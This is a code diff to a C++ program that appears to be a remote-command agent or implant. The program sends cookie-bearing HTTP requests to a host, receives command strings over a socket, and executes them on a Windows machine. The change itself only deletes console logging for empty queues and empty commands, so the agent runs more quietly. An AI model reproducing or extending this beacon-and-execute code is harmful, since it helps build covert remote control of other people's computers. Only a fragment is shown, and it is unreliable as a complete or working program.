@@ -101,8 +101,7 @@ std::string buildRequest(const std::string& path, const std::string& host, const
                "\r\n"; 
         
     } else {
-        // Queue is empty, return request without command information
-        std::cout << "Empty queue" << std::endl;
+        // Queue is empty, return request without command information;
         std::string cookiesString = createCookiesString(); 
         return "GET /" + path + "?" + " HTTP/1.1\r\n"
                "Host: " + host + "\r\n"
@@ -293,8 +292,6 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
     if (cmdString.length() >= 1) {
         addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
         wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
-    } else {
-        std::cerr << "Received empty command" << std::endl;
     }
     cmdString.clear();
     queryParams.clear();
